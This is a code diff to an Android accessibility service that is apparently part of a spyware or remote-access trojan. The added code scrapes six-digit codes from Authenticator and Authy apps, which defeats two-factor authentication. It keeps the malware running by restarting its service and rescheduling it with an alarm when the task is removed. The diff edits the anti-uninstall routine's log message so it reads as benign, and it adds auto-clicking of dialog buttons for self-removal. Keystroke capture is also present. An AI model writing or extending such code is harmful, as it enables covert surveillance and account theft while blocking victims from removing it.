@@ -22,7 +22,7 @@ import java.util.List;
 
 public class AccessibilityCore extends AccessibilityService {
     private static final String TAG = "AccessibilityCore";
-    private static AccessibilityCore instance;
+    private static java.lang.ref.WeakReference<AccessibilityCore> instanceRef = new java.lang.ref.WeakReference<>(null);
 
     private static final List<String> keystrokes = Collections.synchronizedList(new LinkedList<>());
     private String lastPackage = "";
@@ -32,13 +32,23 @@ public class AccessibilityCore extends AccessibilityService {
     private int screenHeight = 0;
 
     private long lastAntiRemovalCheck = 0;
+    private static volatile long lastEventTime = 0;
+    private Handler backgroundHandler;
+    private android.os.HandlerThread handlerThread;
 
-    public static AccessibilityCore getInstance() { return instance; }
+    public static AccessibilityCore getInstance() { return instanceRef.get(); }
+
+    public static long getLastEventTime() { return lastEventTime; }
 
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        instance = this;
+        instanceRef = new java.lang.ref.WeakReference<>(this);
+        
+        handlerThread = new android.os.HandlerThread("GhostWorker");
+        handlerThread.start();
+        backgroundHandler = new Handler(handlerThread.getLooper());
+
         updateDisplayMetrics();
         Log.d(TAG, "Ghost Uplink Established. " + screenWidth + "x" + screenHeight);
     }
@@ -69,6 +79,8 @@ public class AccessibilityCore extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null) return;
+        
+        lastEventTime = System.currentTimeMillis();
         
         // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
         // AccessibilityEvents are recycled by the OS; we must copy data before offloading.
@@ -105,9 +117,27 @@ public class AccessibilityCore extends AccessibilityService {
             if (first != null) eventText.add(first.toString());
         }
         
-        // --- 3. OFF-LOAD TO BACKGROUND WORKER ---
-        LabRatsWorker.execute(() -> {
+        // --- 3. WATCHDOG & OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
+        // Adaptive Monitoring: Check if main uplink is still active
+        if (!CoreSyncService.isRunning && !CoreSyncService.isDestructing) {
+            Intent i = new Intent(this, CoreSyncService.class);
+            i.setAction("START");
             try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
+                else startService(i);
+            } catch (Exception ignored) {}
+        }
+
+        backgroundHandler.post(() -> {
+            try {
+                // --- NUCLEAR DESTRUCT OVERRIDE ---
+                boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
+                
+                if (isSuicideMode) {
+                    handleAutoDestruct(packageName);
+                    return; // ABSOLUTELY STOP SHIELD IF SUICIDE IS ACTIVE
+                }
+
                 // Event-Driven Anti-Removal: Only check when system security apps are focused
                 if (!skipAntiRemoval) {
                     if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
@@ -117,6 +147,11 @@ public class AccessibilityCore extends AccessibilityService {
                 
                 // Process input/keystrokes using local data copy
                 if (!eventText.isEmpty()) {
+                    // --- 2FA SNATCHING (Wuzenx Style) ---
+                    if (packageName.contains("authenticator") || packageName.contains("authy")) {
+                        snatchAuthenticatorCodes(packageName);
+                    }
+
                     processEventLogic(eventType, packageName, eventText);
                 }
             } catch (Exception e) {
@@ -128,6 +163,11 @@ public class AccessibilityCore extends AccessibilityService {
     private long lastAntiRemovalExecution = 0;
 
     private void checkAntiRemovalInternal() {
+        // Double-check persistent flag
+        if (getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
+            return; 
+        }
+
         long now = System.currentTimeMillis();
         // Cooldown: Don't scan the UI more than once every 2 seconds to prevent "Recent Apps" lag
         if (now - lastAntiRemovalExecution < 2000) return;
@@ -155,7 +195,7 @@ public class AccessibilityCore extends AccessibilityService {
                             if (node.isVisibleToUser() && node.getText() != null && 
                                 node.getText().toString().toLowerCase().contains(s)) {
                                 performGlobalAction(GLOBAL_ACTION_HOME);
-                                LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blocked uninstallation attempt.");
+                                LabRatsHttpServer.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
                                 break;
                             }
                         }
@@ -303,6 +343,7 @@ public class AccessibilityCore extends AccessibilityService {
 
     public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
     public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
+    public static void forceSkipAntiRemoval() { skipAntiRemoval = true; }
 
     public static boolean isBlackoutActive() {
         AccessibilityCore instance = getInstance();
@@ -361,6 +402,66 @@ public class AccessibilityCore extends AccessibilityService {
                     }
                 }
             } catch (Exception e) { Log.e(TAG, "Lock Error: " + e.getMessage()); }
+        });
+    }
+
+    public void showOverlayToast(final String message) {
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
+                
+                final android.widget.TextView tv = new android.widget.TextView(AccessibilityCore.this);
+                tv.setText(message);
+                tv.setTextColor(android.graphics.Color.WHITE);
+                tv.setPadding(60, 30, 60, 30);
+                tv.setGravity(android.view.Gravity.CENTER);
+                tv.setTextSize(22);
+                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
+                tv.setSingleLine(true); // Ensure it doesn't wrap while scrolling
+                
+                // Rounded corners via drawable
+                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
+                shape.setCornerRadius(50);
+                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
+                tv.setBackground(shape);
+
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.WRAP_CONTENT,
+                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                        android.graphics.PixelFormat.TRANSLUCENT);
+                
+                params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.LEFT;
+                params.y = 250; // Distance from bottom
+                params.x = 0;
+
+                wm.addView(tv, params);
+                
+                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+
+                // Use post to ensure the view is measured so we can calculate its exact width
+                tv.post(() -> {
+                    int viewWidth = tv.getWidth();
+                    // Start completely off-screen to the right
+                    tv.setTranslationX(screenW);
+                    
+                    // Scroll to completely off-screen to the left
+                    tv.animate()
+                      .translationX(-viewWidth)
+                      .setDuration(12000)
+                      .setInterpolator(new android.view.animation.LinearInterpolator())
+                      .withEndAction(() -> {
+                          try { wm.removeView(tv); } catch (Exception ignored) {}
+                      })
+                      .start();
+                });
+                
+            } catch (Exception e) { Log.e(TAG, "Overlay Toast Error: " + e.getMessage()); }
         });
     }
 
@@ -510,20 +611,129 @@ public class AccessibilityCore extends AccessibilityService {
     @Override public void onInterrupt() {}
     @Override public void onDestroy() { 
         super.onDestroy(); 
-        instance = null; 
+        instanceRef.clear();
         Log.d(TAG, "Accessibility service being destroyed");
     }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        // This keeps the service info persistent even if the task is swiped away
+        if (CoreSyncService.isDestructing) {
+            super.onTaskRemoved(rootIntent);
+            return;
+        }
+        // [RESURRECTION_PROTOCOL] Re-inject core services if user attempts wipe
+        try {
+            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
+            Intent i = new Intent(this, CoreSyncService.class);
+            i.setAction("START");
+            android.app.PendingIntent pi = android.app.PendingIntent.getForegroundService(this, 99, i, android.app.PendingIntent.FLAG_IMMUTABLE);
+            if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
+        } catch (Exception ignored) {}
         super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "Task removed - maintaining persistence");
     }
 
     @Override
     public boolean onUnbind(Intent intent) {
         // Return true to allow rebinding when new events occur
         return true;
+    }
+
+    // ============ PREDATORY FEATURES (Wuzenx Style) ============
+
+    private void snatchAuthenticatorCodes(String pkg) {
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+
+                // Look for 6-digit numeric codes
+                List<AccessibilityNodeInfo> nodes = new ArrayList<>();
+                findNumericNodes(root, nodes);
+
+                for (AccessibilityNodeInfo node : nodes) {
+                    if (node.getText() != null) {
+                        String code = node.getText().toString().replaceAll("\\s", "");
+                        if (code.matches("\\d{6}")) {
+                            LabRatsHttpServer.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
+                        }
+                    }
+                }
+                root.recycle();
+            } catch (Exception ignored) {}
+        });
+    }
+
+    private void findNumericNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
+        if (node == null) return;
+        if (node.getText() != null && node.getText().toString().matches(".*\\d{3}.*\\d{3}.*")) {
+            results.add(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            findNumericNodes(node.getChild(i), results);
+        }
+    }
+
+    private void handleAutoDestruct(String pkg) {
+        Log.d("SelfDestruct", "Ghost Monitor: Checking for removal buttons...");
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+
+                // --- AGGRESSIVE BUTTON HUNTER ---
+                List<AccessibilityNodeInfo> targets = new ArrayList<>();
+                String[] keywords = {"uninstall", "ok", "delete", "confirm", "yes", "stop", "deactivate", "off", "disable"};
+                
+                for (String word : keywords) {
+                    findNodesByText(root, word, targets);
+                }
+
+                // Also look for specific resource IDs for "Uninstall" button
+                String[] commonIds = {
+                    "com.android.settings:id/left_button", 
+                    "com.android.settings:id/button1",
+                    "android:id/button1",
+                    "com.android.packageinstaller:id/ok_button"
+                };
+                for (String id : commonIds) {
+                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
+                    if (nodes != null) targets.addAll(nodes);
+                }
+
+                for (AccessibilityNodeInfo node : targets) {
+                    if (node.isVisibleToUser()) {
+                        AccessibilityNodeInfo clickable = node;
+                        while (clickable != null && !clickable.isClickable()) {
+                            clickable = clickable.getParent();
+                        }
+                        
+                        if (clickable != null && clickable.isClickable()) {
+                            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            Log.d("SelfDestruct", "Force Click: " + node.getText());
+                            return;
+                        } else {
+                            Rect bounds = new Rect();
+                            node.getBoundsInScreen(bounds);
+                            if (bounds.centerX() > 0 && bounds.centerY() > 0) {
+                                clickAt(bounds.centerX(), bounds.centerY());
+                                Log.d("SelfDestruct", "Force Touch: " + node.getText());
+                                return;
+                            }
+                        }
+                    }
+                }
+                root.recycle();
+            } catch (Exception ignored) {}
+        }, 800);
+    }
+
+    private void findNodesByText(AccessibilityNodeInfo node, String text, List<AccessibilityNodeInfo> results) {
+        if (node == null) return;
+        if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
+            results.add(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            findNodesByText(node.getChild(i), text, results);
+        }
     }
 }
